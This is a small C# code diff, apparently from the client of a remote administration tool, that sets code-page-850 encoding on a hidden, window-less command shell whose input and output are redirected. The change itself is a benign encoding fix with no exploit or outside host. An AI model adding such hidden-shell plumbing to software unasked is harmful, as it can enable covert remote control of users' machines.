@@ -52,6 +52,8 @@ namespace xClient.Core.Utilities
                     RedirectStandardInput = true,
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
+                    StandardOutputEncoding = Encoding.GetEncoding(850),
+                    StandardErrorEncoding = Encoding.GetEncoding(850),
                     CreateNoWindow = true,
                     WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                     Arguments = "/K"
